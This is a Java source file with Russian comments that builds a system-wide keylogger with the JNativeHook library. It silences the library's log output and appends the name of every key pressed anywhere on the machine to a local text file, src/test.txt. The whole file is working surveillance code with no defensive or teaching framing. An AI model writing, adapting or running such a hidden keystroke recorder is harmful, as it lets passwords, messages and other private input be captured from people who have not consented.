import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class Main implements NativeKeyListener {
    public static void main(String[] args) {
        //отключение вывода логов в консоль
        LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        try {
            //подключаем ловушку
            GlobalScreen.registerNativeHook();
            //добавляем считыватель клавиш
            GlobalScreen.addNativeKeyListener(new Main());
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    @Override
    //метод при нажатии клавиши
    public void nativeKeyPressed(NativeKeyEvent nke) {
        //при нажатии SPACE создаётся файл test.txt(если его нет) и печатается пробел
        if (nke.getKeyCode()==NativeKeyEvent.VC_SPACE) {
            try {
                FileWriter fw = new FileWriter("src//test.txt", true);
                fw.write(" ");
                fw.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        // при нажатии ENTER создаётся файл test.txt(если его нет) и печатается перенос на следующую строку
        else if (nke.getKeyCode()==NativeKeyEvent.VC_ENTER) {
            try {
                FileWriter fw = new FileWriter("src//test.txt", true);
                fw.write("\n");
                fw.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        //при нажатии стрелки вниз создаётся файл test.txt(если его нет) и печатается (стрелкаВНИЗ)
        else if (nke.getKeyCode()==NativeKeyEvent.VC_DOWN) {
            try {
                FileWriter fw = new FileWriter("src//test.txt", true);
                fw.write("(стрелкаВНИЗ)");
                fw.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        // при нажатии остальных клавиш, создаётся файл test.txt(если его нет) и печатается значение клавиши
        else {
            try {
                FileWriter fw = new FileWriter("src//test.txt", true);
                //печать в файл значения нажатой клавиши
                fw.write(NativeKeyEvent.getKeyText(nke.getKeyCode()));
                fw.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {

    }
}
